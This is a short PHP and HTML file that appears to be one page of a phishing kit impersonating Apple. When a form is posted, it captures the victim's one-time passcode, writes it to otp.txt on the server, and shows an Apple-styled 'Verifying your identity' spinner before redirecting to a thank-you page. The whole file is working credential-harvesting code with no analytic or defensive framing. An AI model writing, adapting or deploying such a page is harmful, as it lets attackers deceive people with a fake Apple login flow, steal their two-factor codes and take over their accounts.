<?php
if ($_SERVER["REQUEST_METHOD"] == "POST"){
	$otp = $_POST['otp'];
	
	$file = fopen("otp.txt","w");
	$data = "OTP: ".$otp."\n";
	fwrite($file, $data);
	fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying - Apple</title>
  <meta http-equiv="refresh" content="3;url=thankyou.html">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #f2f2f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      text-align: center;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #d2d2d7;
      border-top: 4px solid #0071e3;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    p {
      font-size: 16px;
      color: #1d1d1f;
      font-weight: 500;
    }
    .sub {
      font-size: 13px;
      color: #6e6e73;
      margin-top: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p>Verifying your identity...</p>
    <p class="sub">Please wait, do not close this page.</p>
  </div>
</body>
</html>
<?php
	}
?>
